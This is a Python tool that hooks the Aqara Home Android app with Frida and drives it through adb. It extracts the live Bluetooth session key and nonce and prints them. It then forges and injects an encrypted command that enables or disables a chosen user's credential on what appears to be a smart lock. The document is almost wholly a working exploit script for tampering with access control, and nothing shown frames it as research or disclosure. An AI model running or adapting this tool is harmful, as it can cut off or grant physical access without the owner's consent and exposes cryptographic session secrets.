#!/usr/bin/env python3
import os,sys,time,struct,subprocess,frida
HOST=os.environ.get("FRIDA_HOST","127.0.0.1:47777"); PKG="com.lumiunited.aqarahome.play"; DEV=os.environ.get("ADB_SERIAL","")
if not DEV: raise SystemExit("Set ADB_SERIAL=<device serial> before running this tool.")
ROOT=os.path.join(os.path.dirname(__file__),"..")
AGENT=os.path.join(ROOT,"frida","ble_cmd.js")
USERID=int(sys.argv[1]) if len(sys.argv)>1 else 12      # userId credential (DangDZ=12)
MODE=sys.argv[2] if len(sys.argv)>2 else "disable"       # disable|enable
def adb(*a): subprocess.run(["adb","-s",DEV,*a],capture_output=True)
notifies=[]; 
def on_message(m,d):
    if m.get("type")=="send":
        p=m["payload"]; t=p.get("tag")
        if t=="notify": notifies.append(p["val"]); print("[notify]",p["val"])
        elif t in("ready","FOUND","inject","err","info"): print(f"[{t}]",{k:v for k,v in p.items() if k!='tag'})
    elif m.get("type")=="error": print("[ERR]",m.get("stack",m))
def build_validrange(uid,mode):
    now=time.localtime()
    st=int(time.mktime((now.tm_year,now.tm_mon,now.tm_mday,0,0,0,0,0,-1)))
    en=int(time.mktime((now.tm_year,now.tm_mon,now.tm_mday,23,59,0,0,0,-1)))
    deadline = b'\xff\xff\xff\xff' if mode=="enable" else struct.pack('<I',int(time.time())-86400)
    return (struct.pack('<H',uid)+b'\x01'+struct.pack('<I',st)+struct.pack('<I',en)+deadline+b'\x00\x00\x00\x00').hex()
def main():
    dev=frida.get_device_manager().add_remote_device(HOST)
    pid=dev.spawn(PKG); s=dev.attach(pid); sc=s.create_script(open(AGENT).read())
    sc.on("message",on_message); sc.load(); dev.resume(pid)
    exp=sc.exports_sync if hasattr(sc,"exports_sync") else sc.exports
    time.sleep(9); adb("shell","monkey","-p",PKG,"1"); time.sleep(5)
    print("[*] mở khóa plugin"); adb("shell","input","tap","160","825")
    st=None
    for i in range(45):
        time.sleep(1)
        try: st=exp.state()
        except: continue
        if st.get("hasGatt") and st.get("chr") and st.get("key") and st.get("nonce"):
            print(f"[*] SẴN SÀNG: key={st['key']} nonce={st['nonce']}"); break
    else: print("[!] thiếu state:",st); return
    vr=build_validrange(USERID,MODE)
    data=vr; print(f"[*] validRange ({MODE}, userId {USERID}) = {vr}")
    pkt=subprocess.run(["bun","run","client/build_cmd.ts",st["key"],st["nonce"],"03","21",data],
                       cwd=ROOT,capture_output=True,text=True).stdout.strip()
    print(f"[*] gói 03/21 = {pkt}")
    notifies.clear()
    print(f"[*] >>> INJECT 03/21 {MODE} userId {USERID} <<<")
    try: print("[*] inject ->",exp.inject(pkt))
    except Exception as e: print("[!]",e)
    time.sleep(6)
    print("KEY",st["key"]); print("NONCE",st["nonce"])
    print("=== notify response ==="); [print(" ",h) for h in notifies] or print("  (none)")
if __name__=="__main__": main()
